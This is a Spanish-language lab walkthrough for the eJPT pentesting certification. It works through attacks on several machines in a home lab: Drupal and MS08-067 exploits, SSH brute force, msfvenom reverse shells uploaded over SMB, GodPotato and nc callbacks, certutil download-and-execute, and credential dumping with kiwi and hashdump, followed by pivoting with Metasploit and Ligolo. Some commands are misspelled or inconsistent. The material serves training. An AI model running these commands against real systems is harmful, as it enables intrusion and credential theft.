---
title: "La ruta secreta para la certificación eJPT"
date: 2026-05-14 21:47:00 -0500
categories: [Pentesting, Windows Security, Post-Exploitation]
tags: [Metasploit, BadBlue, Pivoting, RDP, Privilege Escalation, Hydra, SSH, Meterpreter, msfvenom]
description: "Guía completa de laboratorios: explotación de BadBlue, técnicas de pivoting, persistencia con RDP y escalación de privilegios en Windows."
toc: true
---

# La ruta secreta para la certificación eJPT
En este laboratorio se procede a realizar una simulación a la prueba eJPTA, para ello se configura las maquinas de la siguiente manera
* Kali VMnet2 NAT
* DC1 2 interfaces VMnet2 NAT y VMnet15
* Robot 2 interfaces VMnet2 NAT
* metasploitable3 VMnet15
* Windows Server 2019 VMnet2 NAT
* Gift VMnet15
* doc VMnet2 NAT
* synfonos VMnet2 NAT
* Windows XQP VMnet2 NAT

De esa manera se debe configurar las interfaces de las máquinas y ahora si se procede a escanear todo con Kali Linux.

## Equipo 1 - DRUPAL
### Identificación de equipos
```shell
ip add
    192.168.100.128/24
```
Lo siguiente es reconocer los host que están en la red
```shell
arp-scan --localnet
```
![ARP SCAN](/assets/img/Primer-Blog/ruta-secreta/arp.png){: width=auto }
_arp-scan_
En la imagen se puede apreciar que VMWare genera 3 ips para su funcionamiento que en este caso son la .1 .2 y .254, máquinas que inician con la dirección 00:0c son de VMWare.
Para ser organizado se debe empezar creando un archivo
```shell
nano hosts_dmz.txt
    192.168.100.129
    192.168.100.131
    192.168.100.134
    192.168.100.133
    192.168.100.136
    192.168.100.140
```
Si no se tiene la opción de arp-scan, utilizamos nmap
```shell
nmap -sn 192.168.100.128/24
```
Con ese comando nos detecta nuestra propia dirección de la máquina kali.
```shell
sudo netdiscover -r 192.168.100.128/24
```
De esta manera tenemos 3 formas distintos de reconocer la red.

### Identificar nombres de quipos
Para saber los nombres que tiene cada equipo con el servicio SMB habilitado, se procede con:
```shell
crackmapexec smb 192.168.100.0/24
```
![Crackmapexec](/assets/img/Primer-Blog/ruta-secreta/crackmapexec.png){: width=auto }
_crackmapexec_
En base al resultado, observamos que tenemos los equipos llamados:

```shell
nano host_names.txt
    192.168.100.1 LAPTOP-DR11V3GT
    192.168.100.134 CRISV-AC8148ECD
    192.168.100.134 KHO
    192.168.100.131 SIMPLE
```

### Identificar puertos del host 192.168.100.129
Ahora debemos ir revisando que puertos están activos en cada host.
```shell
nmap -p- 192.168.100.129
    22/tcp open
    80/tcp open
    111/tcp open
    57606/tcp open
namp -p22,80,111,57606 -sVC -T5 192.168.100.129 -o host_129.txt
```
Para saber que es lo que tenemos con telnet hacemos una pequeña conexión
```shell
telnet 192.168.100.129 111
telnet 192.168.100.129 5706
telnet 192.168.100.129 22
    #SSH-2.0-OPENSSH_6.0P1
```
Con lo que hemos revisado ya sabemos que la máquina es una DRUPAL 7, por lo que abrimos en el navegador
![Drupal](/assets/img/Primer-Blog/ruta-secreta/drupal.png){: width=auto }
_drupal_

Drupal es un gestor de contenido similar a Wordpress pero hasta ahora no tenemos la versión exacta.
```shell
seachsploit drupal 7.57
```
![Searchsploit](/assets/img/Primer-Blog/ruta-secreta/searchsploit.png){: width=auto }
_searchsploit_
El resultado nos indica que 
* tenemos un script que requiere AUTHENTICACIÓN
* Vulenerabilidades REMOTE CODE
* El path si es de forma LOCAL, significa que previamente debía haber accedido de Forma Remota para luego escalar privilegios.
* La extensión RB es de Rubí y esos son para metasploit.

Ahora procedemos a copiarnos el exploit
```shell
searchsploit -m 44448
```
Con eso hacemos una copia, con el cuál debemos leer para saber los parámetros que requerimos pasarle. Para ejecutar se utiliza
```shell
python3 vlndrupal.py 192.168.100.129
    #Vuln
```
Ahora para utilizar los otros, procedemos con metasploit
```shell
msfconsole -q
    use uninx/webapp/drupal_drupalgeddon2
        set LPORT 1234
        set RHOST 192.168.100.129
        run
```
En caso de que el Drupal no se encuentre en la /, debemos cambiar el TARGETURI. Con lo que se configuró ya se abrió la sesión de meterpreter
```shell
getuid
    #www-data
ipconfig
    #Comando no soportado
```
> **Tip Profesional:** Siempre se debe poner ipconfig sea windows o linux, si no funciona, no podemos hacer pivoting.
{: .prompt-info }
```shell
shell
    ls
    cd /var/www
    find . -name settings.php
    cd /var/www/sites/default

    mysql -u dbuser -p
```
Esta shell da error porque no responde el comando de mysql. Para evitar eso mejoramos la shell con otro módulo de meterpreter
```shell
use /multi/manage/shell_to_meterpreter
    set session 1
    run

    session 2
        ipconfig
```
Con esta segunda shell ya permite hacer pivoting, ya que ipconfig si funciona.

### Enumeración de usuarios
PAra enumerar en la misma sesión utilizamos los siguientes comandos
```shell
cat /etc/passwd
```
Para saber que usuarios hay son los que tienen acceso a la shell /bin/bash

### Búsqueda de binarios SUID
```shell
find / -perm -u=s -type f 2>/dev/null
    binario find

find .  -exec /bin/sh \; -quit
    whoami
    #root
```

### Fuerza bruta ssh
Con el archivo passwd  podemos encontrar 2 usuarios, flag4 y root, para acceder podemos conectarnos mediante ssh y como no sabemos la clave, utilizamos **hydra**
```shell
hydra -l flag4 -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.100.129
hydra -t 16 -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.129
```
El resultado arroja orange
```shell
ssh flag4@192.168.100.129
    orange

    mysql -u dbuser -p
    R0ck3t

    show databases;
    use drupaldb;
    show tables;
    select * from users;
```
Conectandonos a la base de datos, podemos encontrar correos de los usuarios, contraseñas que se pueden descifrar con John
```shell
hashes.txt
    #Guardar los hashes encontrados
john hashes.txt
    #password
```
### SSH Clave pública y privada
Ahora esta máquina tiene una segunda interfaz, la cual nos permite hacer pivoting. Algo importante es generar una clave pública para generar persistencia cuando nos conectemos.
```shell
ssh-keygen -t rsa  -b 4096 -C "persistencia@EQUIPO1"
```
Con esta llaves nos permite conectarnos sin utilizar la contraseña
```shell
ssh-copy-id -i /home/kali/.ssh/id_rsa.pub flag4@192.168.100.129
```
Ahora simplemente accedemos y ya no nos solicita la contraseña.
```shell
ssh flag4@192.168.100.129
    cd .ssh
    cat authorized_keys
```

## Segunda máquina comprometida Windows
```shell
nmap -p- 1912.168.100.131 -v
nmap -p 80,139,445 -sVC -n -sS --min-rate 5000 192.168.100.131 -o host_131.txt
```
Si en obtenemos el puerto 445, se debe provar la siguiente vulnerabilidad
```shell
sudo nmap -p 445 --script=smb-vuln* --min-rate 5000 192.168.100.131 -o smb_vuln.txt
```
En este caso no se encontró ninguna vulnerabilidad.

Como el resultado del escaneo, arrojó el puerto 80, desde el navegador accedemos a la web y nos arroja 5 nombres, que debemos guardarnos en un archivo ya que provablemente pueden ser nombres de usuarios.
```shell
nano users.txt
    ruy
    marcos
    lander
    bogo
    viper
```
También se puede dejar corriendo un dirb para encontrar directorios
```shell
dirb http://192.168.100.131
```
Otro tip es probar con smbclient con contraseñas o de forma anónima
```shell
smbclient -L 192.168.100.131 -N
enum4linux 192.168.100.131
hydra -L users.txt -P users.txt smb://192.168.100.131
crackmapexec smb 192.168.100.131 -u useres -p users.txt
```
Con la fuerza bruta realizada con crackmapexec se encuentran credenciales, si solo aparece un **(+)** significa que podemos conectarnos a los directorios, en caso de que aparezca **!PWNED** significa que esas credenciales si nos sirve para conectarnos por SSH.
```shell
psexec.py bogo:bogo@192.168.100.131 #Al no ser credenciales válidas no logramos conectarnos a la shell
smbclient -L 192.168.100.131 -U bogo #Listado de recursos compartidos
smbclient -L //192.168.100.131/LOGS -U marcos 
```
Ahora podemos intentar subir una revshell pero hay que revisar que haya permisos de PUT, primero con un archivo de texto y este hay que intentar abrir desde el navegador. En caso de ejecutarse ya podemos subir una revshell.
Como estoy en un servidor windows, se debe subir una revshelll aspx.
Para ello nos apoyamos de la web [Revshells](https://revshells.com) y escogemos lo siguiente:
* MSFVenom
* Windows Staged ASPX Reverse TCP

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.128 LPORT=9002 -f aspx -o reverse.aspx
smbclient -L //192.168.100.131/LOGS -U marcos
    put reverse.aspx

msfconsole -q
use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lhost 192.168.100.128
    set lport 9002
    run
```
Desde el navegador buscamos a reverse.aspx lograremos abrir la sesión.
```shell
getuid
getsystem
get privs
    SeImpersonatePrivilege
Ctrl+Z
```

Ahora vamos a aprovechar el **SeImpersonatePrivilege** con ayuda de msfconsole
```shell
use /exploit/windows/local/ms16_075_reflection_juicy
    set payload windows/x64/meterpreter/reverse_tcp
    set session 1
    run
```
En este caso no funcionó, así que probamos otro método regresando a la sesión
```shell
session 1
shell
    dir
    cd c:\Users\Public\Downloads #En este caso ya tenemos goodpotato subido.
    GodPotato-NET4.exe -cmd "nc.exe cmd 192.168.100.128 9797"

#En otra shell
rlwrap nc -nlvp 9797
    whoami
        nt authority\system
    certutil.exe -f -split -utlcache "https://192.168.100.128/reverse.exe reverse.exe" #Nos descargamos del servidor pythone que está a continuación
    reverse.exe
```
Para escalar privilegios tenemos varios binarios como GodPotato, PrintSpoofer, Juicy_potato. En este caso ocupamos GodPotato

Ahora como ya accedimos a linux pero no mediante una sesión meterprete, debemos cambiar la shell y para ello nos apoyamos de (Revshells)[https://revshells.com] con los siguientes parámetros:
* Windows Meterpreter staged Reverse TCP (x64)

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.128 LPORT=9001 -f exe -o reverse.exe
python3 -m http.server 80

msfconsole -q
use exploit/multi/handler
    set payload windows/x64/meterpereter/reverse_tcp
    set lhost 192.168.100.128
    set lport 9001
    run
        getuid
            #NT Authority System
        ipconfig
        hashdump #hashes de usuarios
nano hashes.txt
    #Copiar y pegar
cut -d ":" -f 4 hashes.txt    
```
Con esa combinación de los hashes podemos colocar todos en crackstation para ver cuáles puede descifrar.
![Crackstation](/assets/img/Primer-Blog/ruta-secreta/crackstation.png){: width=auto }
_crackstation_

Al tener meterpreter activo ahora procedemos a utilizar el módulo **KIWI** dentro de meterpereter para sacar los hashes NTLM
```shell
load kiwi
    help
creds_wdigest
creds_all
getuid
lsa_dump_sam
```
Aunque la misma información se saca con HashDump y con esto terminamos de comprometer el segundo equipo.

Preguntas que hacen en la certificación es cuántos parches se han instalado en el equipo y para ver esos parches
```shell
meterpreter> shell
    systeminfo
    net user
    net localgroup
    wmic qfe list full
```

## Tercera máquina comprometida Windows XP
Primero empezamos con un ping para saber que equipo es:
```shell
ping 192.168.100.134
nmap --scrip smb-vuln* 192.168.100.134
crackmapexec smb 192.168.100.134
    #Arquitectura de x32 bits

msfconsole -q
    search ms08-067

    use exploit/windows/smb/ms08_067_netapi
        set lport 4142
        set rhost 192.168.100.134
        run
```
Con esto accedemos a meterpreter, al ser una máquina Windows Xp tiene muchas vulnerabilidades.
```shell
getuid
hashdump

nano hashes.txt
cat -d ":" -f 4 hashes.txt

load kiwi
    creds_wdigest
    creds_all
```
Con el listado ya podemos copiar a crackstation para tener los hashes listos. Como no encontramos usuarios pero ya tenemos acceso root, podemos crearnos un nuevo usuario desde cmd.
```shell
shell
    net user alvaro password
```
Al hacer nuevamente **Creds_all** dentro del módulo Kiwi, encontramos la contraseña ya que windows xp sabía almacenar las contraseñas en texto plano.
En esta máquina también existe otra vulnerabilidad que usamos con msfconsole
```shell
msfconsole -q
    use windows/smb/ms17_010_psexec
        set RHOST 192.168.100.134

        getuid
        systeminfo
        ipconfig
```
Con esto ya se termina la máquina ya que es muy sencillo vulnerar este equipo.


## Cuarta máquina comprimetida Wordpress
Esta nueva máquina está en la ip 192.168.100.133
```shell
ping 192.168.100.133
nmap -p- 192.168.100.133
enum4linux 192.168.100.133 #kho y jpgaultier
smbclient -L 192.168.100.133 -N #Forma anónima
smbclient //192.168.100.133/anonymous
```
En el recurso compartido de anonymous encontramos un archivo de texto que dice ojo.txt en el cual nos informa que la siguiente persona que utilice la contraseña abc123, 123321, qwerty será despedida.

```shell
nano users.txt
    kho
    jpgaultier
nano password.txt
    abc123
    123321
    qwerty
hydra -L users.txt -P password.txt smb://192.168.100.133 #Error
hydra -L users.txt -P password.txt ssh://192.168.100.133 #Error
crackmapexec smb 192.168.100.133 -u users.txt -p password.txt #Error
dirb http://192.168.100.133

smbclient //192.168.100.133/kho -U kho
    qwerty
```
En el recurso compartido kho, se encuentra una archivo todo.txt en el cuál informa lo siguiente:
* Debemos agregar kho.local a hosts
* Debemos trabajemos en TH3K1nG 
* No instalemos plugins vulnerables.

```shell
nano /etc/hosts
    192.168.100.133 kho.local
```
Desde la url accedemos a kho.local/TH3K1nG y nos muestra un wordpress y accedemos a kho.local/TH3K1nG/wp-login.php. Al poner el usuario admin, nos dice que la clave está mal por lo que ya sabemos que usuario atacar.

```shell
wpscan --url http://kho.local/Th3K1nG/wp-login.php -U admin
wpscan --url http://kho.local/Th3K1nG/wp-login.php -U admin --password /usr/share/wordlists/rockyou.txt
wpscan --url http://192.168.100.133/Th3K1nG

nmap -sV --script http-wordpress-enum 192.168.100.133
nmap --script http-wordpress-enum --script-args type="themes" 192.168.100.133

find / -name wp-plugins 2>/dev/null
locate ep-plugins.lst

wpscan --url http://192.168.100.133/Th3K1nG --enumerate ap,t --plugins-detection aggressive --force #Funciona

dirb http://192.168.100.133/TH3K1nG/wp-content/plugins -w /usr/share/nmap/nselib/data/wp-plugins.lst
dirb http://kho.local/TH3K1nG/wp-content/plugins -w /usr/share/nmap/nselib/data/wp-plugins.lst
```

> **Tip Profesional:** Si al hacer el wpscan nos da error con el doinio, también se debe intentar con la ip en vez del dominio.
{: .prompt-info }

De todos los métodos para detectar plugins instalados en wordpress solo uno funcionó, por lo que lo siguiente es atacar esa vulnerabilidad.

```shell
searchsploit mail masta #40290.txt
searchsploit -m 40290
cat 40290.txt
```
El searchsploit nos dice que dentro de la ruta:
* http://192.168.100.133/TH3K1nG/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
Si al dar clic derecho y ponemos en ver codigo funte se aprecia mejor todo lo del archivo passwd.
Algo más técnico es mostrar la llave privada - clave rsa del usuario kho:
* http://192.168.100.133/TH3K1nG/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/home/kho/.ssh/id_rsa

```shell
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa kho@192.168.100.133
```
Al tratarnos de conectar directamente a la llave privada, nos pide una contraseña la cuál no sabemos, pero para hacer fuerza bruta, hay un módulo de John que nos permite atacar

```shell
ssh2john id_rsa > rsa.hash
john rsa.hash --wordlists=/usr/share/wordlists/rockyou.txt
```
La contraseña arroja que es xavior

```shell
ssh -i id_rsa kho@192.168.100.133
    xavior

ls
cat flag.txt
find / -perm -4000 2>/dev/null
    find
find . -exec /bin/sh \; -quit
whoami
    root
cd /root
ls
cat flag.txt
```
Con esto ya terminamos la cuarta máquina de vulnerar.

## Quinta máquina comprometida
Ahora nos quedan dos máquinas la 192.168.100.136 y 140
```shell
nmap -p- -sCV 192.168.100.136
```
Esta máquina es doc.hmv, hay que redirigir el nombre en hosts, tiene una vulnerabilidad sql inyection, hay un file upload para subir un archivo vulnerable al sitio web, subimos un archivo tipo rev-php y con eso hacemos la escalación de privilegios con un binario suid.

## Sexta máquina comprometida
Ahora procedemos con la última que es 192.168.100.140

Pero antes debemos configurar el laboratorio en conjunto con la máquina robot y metasploitable 3.
* En metasploitable3 escogemos la interfaz VMNet2 (NAT)
* Sudo arp-scan --localnet -> Que nos da la nueva ip 192.168.100.137
```shell
ping 192.168.100.137
nmap -p- -v -sS -n --min-rate 5000 192.168.100.137
```
De esta máquina que tiene un montón de vulnerabilidad, vamos a empezar con el puerto 8585 que es un WampServer y encontramos un proyecto de wordpress.
```shell
wpscan --url http://192.168.100.137:8585/wordpress/ -e u,vp #Enumerar usuarios y temas
wpscan --url http://192.168.100.137:8585/wordpress/ -U admin --password /usr/share/wordlists/metasploit/unix_passwords.txt
```
Al enumerar usuarios encontramos varios, por lo que probamos con el mismo nombre para usuario y mismo nombre para clave y logramos acceder a wordpress, vemos que está el tema Twenty por lo que editamos el tema y podemos cargar una rev-shell, la cual en linux tenemos la que solo sirve para linux, pero como metasploitable3 es windows, ocupamos la sigueinte rev-shell que es para cualquier sistema operativo [rev-shell](http://github.com/ckiller2HM/scripts/blob/main/php-rev-shell.php).

Ahora debemos poner un listener y abrir una página que no existe. Si nos da error en este otra opción no recomendada es poner el rev-shell en la página Main Index Template.
```shell
nc -lnvp 8765
    whoami
    whoami /priv
```
Al tener SetImpersonatePrivilage, pasamos con msfvenom y subimos con certutil o la segunda opción con Juicy potato pero de metasploit.

Con esto terminamos todos los equipos del laboratorio.

## Pivoting Gift

Empezamos esto a partir de la primera máquina drupal que ya logramos el acceso meterpreter y que permite hacer un ipconfig.
Primero hacer un background de la sesión para regresar a meterpreter y hacemos una ruta entre el equipo de otra red y nuestra red.

```shell
use post/multi/manage/autoroute
    set session 2
    set subnet 10.10.0.0
    run
```
### Formas de analizar ips de otro host
Para escanear las ips que están en otros hosts tenemos las siguientes maneras:
1. Port Scanner

```shell
use auxiliary/scanner/portscan/tcp
    set RHOSTS 10.10.0.0/24
    set PORTS 21-140
    set threads 10
    run
```
2. Arp Scanner
```shell
use post/windows/gather/arp_scanner #Solo funciona en Windows, en Linux da error
    set session 2
    set rhosts 10.10.0.0/24
    run
```
3. Para este caso vamos hacer uso de un script el cuál permite hacer el escaneo de forma más rápida y debemos colocarlo dentro del equipo falg4.

```shell
#!/bin/bash

# Define the network prefix (e.g., 192.168.1)
NETWORK_PREFIX="10.10.0"

# Define the start and end of the IP range to scan
START_IP=1
END_IP=254

echo "Scanning network range: $NETWORK_PREFIX.$START_IP - $NETWORK_PREFIX.$END_IP"
echo "Active hosts:"

for i in $(seq $START_IP $END_IP); do
    IP_ADDRESS="$NETWORK_PREFIX.$i"
    # Ping with 1 packet (-c 1) and a timeout of 1 second (-w 1)
    # Redirect output to /dev/null to suppress ping messages
    ping -c 1 -w 1 "$IP_ADDRESS" &> /dev/null

    # Check the exit status of the ping command
    if [ $? -eq 0 ]; then
        echo "$IP_ADDRESS is up."
    fi
done

echo "Scan complete."
```

> **Tip Profesional:** Al aplicar el autoroute debe ser en el mismo segmento de red en el que esté la máquina con acceso a la segunda red.
{: .prompt-info }

De las 3 opciones, solo 2 nos funciona ya que la otra opción es para windows. Ahora como ya sabemos que nuestra máquina víctima es la 10.10.0.128, sabemos que debemos vulnerar la máquina 129 que fueron las 2 que encontramos.

```shell
msfconsole -q
use auxiliary/scanner/portscan/tcp
    set rhosts 10.10.0.129
    set ports 21-200
    run
```

De este escaneo nos dice que hay dos puertos el 22 y el 80, ahora debemos hacer un portfwd para poder acceder desde nuestra máquina a ese equipo. 
Lo primero es volver a la meterpreter que tenemos en donde funciona ipconfig.

```shell
sessions 2
portfwd add -l 8080 -p 80 -r 10.10.10.129
portfwd add -l 2222 -p 22 -r 10.10.10.129

portfwd list
```
Al haber hecho portfwd le estoy diciendo que los puerto de esa máquina que acabo de encontrar en otra red, los pase a los puertos de mi propia máquina localhost (127.0.0.1) tanto como el 8080 y 2222.
Incluso para acceder a la web que está en el puerto 8080 simplemente desde el navegador accedo a **127.0.0.1:8080**

```shell
ssh -p 2222 root@127.0.0.1

msfconsole -q
    use auxiliary/scanner/ssh/ssh_login
        set rhosts 10.10.10.129
        set username root
        set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
        run

hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://127.0.0.1:2222
```
Con cualquiera de las dos formas encontramos que el usuario y la clave es root:simple

Con esto nos conectamos mediante ssh y con la clave ya tenemos el acceso root. Con esto terminamos este laboratorio.

## Pivoting a Metasploitable 3
Como ya estamos dentro de la máquina que tiene acceso a esta interfaz, simplemente realizamos los escaneos correspondientes
```shell
bash ping.sh #128 129 130
msfconsole -q
use scanner/portscan/tcp
    set rhosts 10.10.0.130 #21,22,80,135,139

    sessions 2
        portfwd add -l 2121 -p 21 -r 10.10.0.130
        portfwd add -l 80 -p 80 -r 10.10.0.130
        portfwd add -l 22 -p 22 -r 10.10.0.130
```

Con eso ya se procede normalmente a atacar la máquina.

## Pivoting con Ligolo en línea.
Para esta máquina empezamos desde la máquina vulnerada DRUPAL, con el acceso ssh al usuario flag4, pero antes debemos instalar ligolo

```shell
mkdir -p ~/Herramientas/ligolo && cd ~/Herramientas/ligolo
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz
tar -xvf ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz 
#Para Windows
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_0.8.3_windows_amd64.zip
unzip ligolo-ng_agent_0.8.3_windows_amd64.zip 
#Para Linux
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_0.8.3_linux_amd64.tar.gz
tar -xvf ligolo-ng_agent_0.8.3_linux_amd64.tar.gz 
```

Ahora es el proceso para instalar de forma automática
```shell
sudo apt update && sudo apt install ligolo-ng -y
sudo apt update && sudo apt install golang -y
cd /home/kali/Herramientas/ligolo
git clone https://github.com/nicocha30/ligolo-ng.git
cd ligolo-ng
env GOOS=windows GOARCH=386 go build -o ../agent_win32.exe cmd/agent/main.go #Agente x32bits de windows
env GOOS=linux GOARCH=386 go build -o ../agent_lin32 ./cmd/agent/main.go #Angente de linux
```

Ahora una vez que tenemos en nuestro equipo se ejecuta de la siguiente manera de forma manual
```shell
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.10.0 dev ligolo
sudo ip addr add 10.10.10.100/24 dev ligolo

uname -m #Ver que arquitectura es para subir el angente que se crea mas abajo
python3 -m http.server 80 #Para pasar de kali al equipo comprometido

wget http://192.168.100.140/agent_lin32
chmod +x agent_lin32
./agent_lin32 -connect 192.168.100.140:11601 -ignore-cert #Ip de kali

sudo ligolo-proxy -selfcert
    #Con esto accedemos pero hay q dejar modo escucha antes de ejecutar el agente
session
    start #Con esto ya establecemos el tunel a la red inaccesible
```
Con eso ya podemos atacar normalmente a las ips de los demás dispositivos de otra red. Pero OJO la comunicación solo es kali a Windows.

### Ataque a metasploitable 3
```shell
xfreerdp /v:10.10.10.130 /u:vagrant /p:vagrant /cert:ignore /sec:rdp
```
Ahora como la comunicación es solo unidireccional, de windows a kali no tengo respuesta, para ello utilizamos ligolo para redireccionar el tráfico

```shell
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 #Todo lo que llegue redirigir a mi equipo local
```
Ahora vamos a enviar un payload
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOSTS=10.10.10.128 LPORT=8080 -f exe -o reverse.exe
python3 -m http.server 80
```
Ahora en otra ventana de kali
```shell
psexec.py vagrant:vagrant@10.10.10.218 #si no tengo esta conexión
crackmapexec smb 10.10.10.218 -u vagrant -p vagrant -x 'certutil -urlcache -split -f http://10.10.10.128:8080/reverse.exe reverse.exe'
crackmapexec smb 10.10.10.218 -u vagrant -p vagrant -x 'dir'

crackmapexec smb 10.10.10.218 -u vagrant -p vagrant -x 'c:\reverse.exe'
```

ahora debemos escuchar la revshell

```shell
msfconsole -q
use /exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lhost 0.0.0.0
    set lport 80
    run
```
Con eso levantamos meterpreter luego de ejecutar el revshell en windows.

Con eso finalizamos todos estos laboratorios.